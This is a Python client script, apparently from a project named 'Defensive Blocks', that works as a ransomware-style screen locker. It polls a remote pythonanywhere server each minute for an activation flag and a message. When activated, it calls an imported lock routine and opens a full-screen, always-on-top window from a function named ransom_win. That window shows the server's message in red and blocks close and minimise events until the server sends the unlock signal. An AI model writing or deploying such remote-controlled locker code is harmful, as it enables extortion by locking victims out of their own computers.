import requests
from Client2.finals import Finals as final
from apscheduler.schedulers.blocking import BlockingScheduler
from threading import Thread
from Client2.assisting import *
from Client2.devcon_automations import *
from time import sleep
import tkinter as tk


getActivation = "http://defensiveblocks.pythonanywhere.com/clients/" + final.USERNAME + "/"
getMsg = "http://defensiveblocks.pythonanywhere.com/clientsm/" + final.USERNAME + "/"
scheduler = BlockingScheduler()


def ransom_win():
    global wa
    print("hello")
    msg = get(final.messageField)
    wa = tk.Tk()
    wa.title('Defensive Blocks')
    wa.overrideredirect(True)
    wa.geometry("{0}x{1}+0+0".format(wa.winfo_screenwidth()+200, wa.winfo_screenheight()+200))
    wa.focus_set()  # <-- move focus to this widget
    wa.protocol("WM_DELETE_WINDOW", exb)
    wa.protocol("WM_MINIMIZE_WINDOW", exb)
    lb1 = tk.Label(wa, text=str(msg) + "\n", font=("Arial Bold", 70), pady=200, fg="RED")
    lb1.pack()
    wa.call('wm', 'attributes', '.', '-topmost', '1')
    while 1:
        wa.update()
        sleep(2)
        a_field = get(final.active_field)
        if a_field == "0":
            wa.destroy()
            return


def main():
    global wa
    activation = (requests.get(getActivation)).text  # current activation
    print(activation)
    msg = (requests.get(getMsg)).text  # current msg
    if get(final.active_field) != activation or msg != get(final.messageField):  # compare previous to current
        replace(final.messageField, msg)
        if (str(activation) == "1") and (str(get(final.active_field)) == "0"):
            print("here")
            replace(final.active_field, activation)
            replace(final.active_flag, 1)
            lock()
            open_window = Thread(target=ransom_win)
            open_window.start()
        elif (str(activation) == "0") and (str(get(final.active_field)) == "1"):
            replace(final.active_field, activation)
            replace(final.active_flag, 0)
            unlock()
    else:
        replace(final.messageField, msg)
        return


scheduler.add_job(main, 'cron', second="0")  # replace if want to 0,30
scheduler.start()
